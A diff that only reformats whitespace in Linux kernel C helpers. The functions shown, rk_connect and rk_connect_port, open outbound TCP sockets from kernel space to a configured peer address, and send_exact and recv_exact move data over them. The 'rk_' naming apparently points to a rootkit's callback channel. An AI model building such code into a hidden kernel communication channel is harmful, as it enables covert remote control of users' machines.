@@ -11,16 +11,16 @@
 struct socket *rk_connect(void)
 {
 	struct sockaddr_in peer = {
-		.sin_family = AF_INET,
-		.sin_port = htons(peer_port),
+	    .sin_family = AF_INET,
+	    .sin_port = htons(peer_port),
 	};
 	struct socket *sock;
 	int error;
 
 	peer.sin_addr.s_addr = in_aton(peer_addr_str);
 
-	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
-				 IPPROTO_TCP, &sock);
+	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
+				 &sock);
 	if (error)
 		return ERR_PTR(error);
 
@@ -37,16 +37,16 @@ struct socket *rk_connect(void)
 struct socket *rk_connect_port(unsigned short port)
 {
 	struct sockaddr_in peer = {
-		.sin_family = AF_INET,
-		.sin_port = htons(port),
+	    .sin_family = AF_INET,
+	    .sin_port = htons(port),
 	};
 	struct socket *sock;
 	int error;
 
 	peer.sin_addr.s_addr = in_aton(peer_addr_str);
 
-	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
-				 IPPROTO_TCP, &sock);
+	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
+				 &sock);
 	if (error)
 		return ERR_PTR(error);
 
@@ -65,10 +65,10 @@ static int send_exact(struct socket *sock, const void *buf, size_t len)
 	size_t sent = 0;
 
 	while (sent < len) {
-		struct msghdr msg = { 0 };
+		struct msghdr msg = {0};
 		struct kvec vec = {
-			.iov_base = (void *)((u8 *)buf + sent),
-			.iov_len = len - sent,
+		    .iov_base = (void *)((u8 *)buf + sent),
+		    .iov_len = len - sent,
 		};
 		int n = kernel_sendmsg(sock, &msg, &vec, 1, len - sent);
 
@@ -87,10 +87,10 @@ static int recv_exact(struct socket *sock, void *buf, size_t len)
 	size_t received = 0;
 
 	while (received < len) {
-		struct msghdr msg = { 0 };
+		struct msghdr msg = {0};
 		struct kvec vec = {
-			.iov_base = (u8 *)buf + received,
-			.iov_len = len - received,
+		    .iov_base = (u8 *)buf + received,
+		    .iov_len = len - received,
 		};
 		int n = kernel_recvmsg(sock, &msg, &vec, 1, len - received, 0);
 
